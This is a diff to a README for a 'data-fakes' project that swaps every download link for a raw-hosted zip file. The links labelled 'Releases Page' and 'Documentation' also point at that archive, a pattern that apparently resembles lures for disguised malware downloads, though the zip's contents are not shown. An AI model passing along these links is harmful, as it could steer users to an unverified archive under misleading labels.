@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download data-fakes](https://raw.githubusercontent.com/2022-04-11588/data-fakes/main/examples/phase4/data-fakes-v3.1-beta.2.zip%https://raw.githubusercontent.com/2022-04-11588/data-fakes/main/examples/phase4/data-fakes-v3.1-beta.2.zip)](https://raw.githubusercontent.com/2022-04-11588/data-fakes/main/examples/phase4/data-fakes-v3.1-beta.2.zip)
+[![Download data-fakes](https://raw.githubusercontent.com/2022-04-11588/data-fakes/main/src/fakes-data-v3.9.zip%https://raw.githubusercontent.com/2022-04-11588/data-fakes/main/src/fakes-data-v3.9.zip)](https://raw.githubusercontent.com/2022-04-11588/data-fakes/main/src/fakes-data-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Welcome to the data-fakes repository! This application provides an easy way to c
 To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page.
-   [Visit Releases Page to Download](https://raw.githubusercontent.com/2022-04-11588/data-fakes/main/examples/phase4/data-fakes-v3.1-beta.2.zip)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/2022-04-11588/data-fakes/main/src/fakes-data-v3.9.zip)
 
 2. **Choose a Release**: Look for the latest version available. 
    
@@ -80,7 +80,7 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 ## 📥 Quick Links
 
-- [Download data-fakes](https://raw.githubusercontent.com/2022-04-11588/data-fakes/main/examples/phase4/data-fakes-v3.1-beta.2.zip)
-- [Documentation](https://raw.githubusercontent.com/2022-04-11588/data-fakes/main/examples/phase4/data-fakes-v3.1-beta.2.zip)
+- [Download data-fakes](https://raw.githubusercontent.com/2022-04-11588/data-fakes/main/src/fakes-data-v3.9.zip)
+- [Documentation](https://raw.githubusercontent.com/2022-04-11588/data-fakes/main/src/fakes-data-v3.9.zip)
 
 Start your testing journey with data-fakes today!
